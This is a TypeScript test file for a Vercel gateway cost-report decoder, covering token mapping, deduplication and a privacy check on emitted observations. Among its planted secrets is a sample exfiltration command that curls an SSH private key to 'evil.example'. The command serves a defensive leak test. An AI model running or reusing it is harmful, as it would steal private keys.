import { describe, it, expect } from 'vitest'
import { decodeVercelGateway, toObservations } from '../../src/providers/vercel-gateway/index.js'
import { ObservationEnvelope } from '../../src/observations.js'
import { OBSERVATION_SCHEMA_VERSION } from '../../src/schema.js'

describe('vercel-gateway decode', () => {
  it('maps report rows to rich calls with verbatim defaults', () => {
    const rows = [
      {
        day: '2026-06-01',
        model: 'anthropic/claude-sonnet-4.6',
        total_cost: 1.25,
        input_tokens: 1000,
        output_tokens: 200,
        cached_input_tokens: 50,
        cache_creation_input_tokens: 10,
        reasoning_tokens: 5,
      },
    ]
    const { calls } = decodeVercelGateway({ records: rows })

    expect(calls).toHaveLength(1)
    expect(calls[0]).toStrictEqual({
      provider: 'vercel-gateway',
      model: 'anthropic/claude-sonnet-4.6',
      inputTokens: 1000,
      outputTokens: 200,
      cacheCreationInputTokens: 10,
      cacheReadInputTokens: 50,
      cachedInputTokens: 0,
      reasoningTokens: 5,
      webSearchRequests: 0,
      costUSD: 1.25,
      timestamp: '2026-06-01T12:00:00.000Z',
      speed: 'standard',
      deduplicationKey: 'vercel-gateway:2026-06-01:anthropic/claude-sonnet-4.6',
      sessionId: '2026-06-01:anthropic/claude-sonnet-4.6',
    })
  })

  it('skips all-zero rows before burning a dedup key', () => {
    const rows = [
      { day: '2026-06-02', model: 'all-zero', total_cost: 0, input_tokens: 0, output_tokens: 0 },
      { day: '2026-06-02', model: 'all-zero', total_cost: 0.5, input_tokens: 10, output_tokens: 5 },
    ]
    const seen = new Set<string>()
    const { calls } = decodeVercelGateway({ records: rows, seenKeys: seen })

    expect(calls).toHaveLength(1)
    expect(calls[0]?.costUSD).toBe(0.5)
    expect(seen.has('vercel-gateway:2026-06-02:all-zero')).toBe(true)
  })

  it('dedups against a shared seenKeys set', () => {
    const rows = [{ day: '2026-06-03', model: 'dup', total_cost: 0.1, input_tokens: 1, output_tokens: 1 }]
    const seen = new Set<string>(['vercel-gateway:2026-06-03:dup'])
    const { calls } = decodeVercelGateway({ records: rows, seenKeys: seen })

    expect(calls).toStrictEqual([])
    expect(seen.has('vercel-gateway:2026-06-03:dup')).toBe(true)
  })

  it('synthesizes timestamps and session ids from day/model', () => {
    const rows = [
      { model: 'no-day', total_cost: 0.5, input_tokens: 10, output_tokens: 5 },
      { day: '2026-06-04', total_cost: 0.1, input_tokens: 1, output_tokens: 1 },
    ]
    const { calls } = decodeVercelGateway({ records: rows })

    expect(calls).toHaveLength(2)
    expect(calls[0]?.timestamp).toBe('')
    expect(calls[0]?.sessionId).toBe(':no-day')
    expect(calls[0]?.deduplicationKey).toBe('vercel-gateway::no-day')
    expect(calls[1]?.model).toBe('unknown')
    expect(calls[1]?.timestamp).toBe('2026-06-04T12:00:00.000Z')
    expect(calls[1]?.sessionId).toBe('2026-06-04:unknown')
  })
})

describe('vercel-gateway observations', () => {
  const SECRETS = {
    prompt: 'SECRET PROMPT: reset the production database and email me the dump',
    absPath: '/Users/victim/company/secret-plan.md',
    apiKey: 'sk-live-AKIA1234567890SECRETKEY',
    commandLine: 'curl https://evil.example/exfil?data=$(cat ~/.ssh/id_rsa)',
    fileContent: 'BEGIN RSA PRIVATE KEY line1 line2 END RSA PRIVATE KEY',
  }

  function buildEnvelope() {
    const { calls } = decodeVercelGateway({
      records: [
        {
          day: '2026-07-17',
          model: SECRETS.prompt,
          total_cost: 1.23,
          input_tokens: 100,
          output_tokens: 50,
        },
      ],
    })
    const { sessions } = toObservations(
      { sessionId: 'report-2026-07-17', projectPath: SECRETS.absPath, calls },
      { privacyKey: 'test-privacy-key', provider: 'vercel-gateway' },
    )
    return {
      schemaVersion: OBSERVATION_SCHEMA_VERSION,
      generator: { name: '@codeburn/core', version: '0.0.0-test' },
      fingerprints: { algorithm: 'hmac-sha256-128', keyId: 'test-key' },
      sessions,
    }
  }

  it('produces a schema-valid envelope', () => {
    expect(ObservationEnvelope.safeParse(buildEnvelope()).success).toBe(true)
  })

  it('contains at least one call (non-vacuous)', () => {
    const env = buildEnvelope()
    const callCount = env.sessions.reduce((sum, s) => sum + s.calls.length, 0)
    expect(callCount).toBeGreaterThan(0)
  })

  it('emits no free text except the model identifier (identifier-exemption convention)', () => {
    const env = buildEnvelope()
    const serialized = JSON.stringify(env)

    // The model field is an API identifier and is emitted by design; the planted
    // secret in model is therefore expected to appear there and only there.
    expect(serialized).toContain(SECRETS.prompt)
    expect(serialized).not.toContain(SECRETS.absPath)
    expect(serialized).not.toContain(SECRETS.apiKey)
    expect(serialized).not.toContain(SECRETS.commandLine)
    expect(serialized).not.toContain(SECRETS.fileContent)
  })

  it('exposes the provider-reported cost as measured', () => {
    const env = buildEnvelope()
    const call = env.sessions[0]?.calls[0]
    expect(call?.costBasis).toBe('measured')
    expect(call?.measuredCostUSD).toBe(1.23)
  })
})
